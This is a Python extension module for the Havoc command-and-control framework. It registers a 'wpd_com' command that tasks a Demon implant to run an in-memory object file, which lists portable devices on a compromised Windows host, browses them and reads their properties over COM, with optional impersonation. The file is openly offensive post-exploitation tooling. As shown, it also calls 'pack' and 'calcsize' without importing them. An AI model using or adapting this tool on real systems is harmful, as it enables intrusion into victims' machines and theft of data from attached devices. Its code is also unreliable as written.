from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
import re


class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addulong(self, dint):
        self.buffer += pack("<I", dint)
        self.size += 4

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s) + 2, s)
        self.size += calcsize(fmt)

    def addguid(self, g):
        hexs = re.sub(r'[^0-9A-Fa-f]', '', g.strip())
        if len(hexs) != 32:
            raise Exception("Invalid GUID")

        raw = bytes.fromhex(hexs)
        b = raw[0:4][::-1] + raw[4:6][::-1] + raw[6:8][::-1] + raw[8:16]
        fmt = "<I16s"
        self.buffer += pack(fmt, 16, b)
        self.size   += calcsize(fmt)


def get_flag(args, flag, default=None):
    for i in range(len(args)):
        if args[i] == flag:
            if i + 1 >= len(args):
                return default
            return args[i+1]
    return default


def get_single(args, flag):
    for i in range(len(args)):
        if args[i] == flag:
            return True
    return False


def wpd_com(demon_id, *args):
    
    task_id: str    = None
    demon:  Demon   = None
    packer: Packer  = Packer()
    option: str     = None

    options = {"ls", "enum", "get_prop"}

    demon = Demon(demon_id)
    num_params = len(args)

    if num_params < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    try:
        option = args[0]

        if option not in options:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Wrong cmd")
            return False

        packer.addint(len(option))

        imp = get_single(args, "--imp")
        packer.addint(int(imp))

        if option == 'ls':
            packer.addint(int(args[1]))
            access = get_flag(args, "--access")
            if access is None:
                packer.addint(0)
            else:
                packer.addulong(int(access, 16))

            recursion = get_flag(args, "--recursion", 2)
            packer.addint(int(recursion))

            path = get_flag(args, "--path")
            if path is not None:
                packer.addWstr(path)

        if option == 'get_prop':

            packer.addint(int(args[1]))
            access = get_flag(args, "--access")
            if access is None:
                packer.addint(0)
            else:
                packer.addulong(int(access, 16))

            prop_guid = get_flag(args, "--prop-guid")
            if prop_guid is None:
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "Property GUID (--prop-guid) missing")
                return False
            packer.addguid(prop_guid)

            prop_id = get_flag(args, "--prop-id")
            if prop_id is None:
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "Property ID (--prop-id) missing")
                return False
            packer.addint(int(prop_id))

    except Exception as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Exception: {e}")
        return False

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to molest some devices")
    demon.InlineExecute(task_id, "go", "/tmp/wpd_com.x64.o", packer.getbuffer(), False)
    return task_id

RegisterCommand(wpd_com, "", "wpd_com", "Portable device stuff via COM", 0, "<flag> [params] [options]", "enum [--imp]\n\t      :  wpd_com ls <device_index> [--path <value>] [--recursion <value>] [--imp] [--access 0xXX]\n\t      :  wpd_com get_prop <device_index> --prop-guid <guid> --prop-id <id> [--imp] [--access 0xXX]")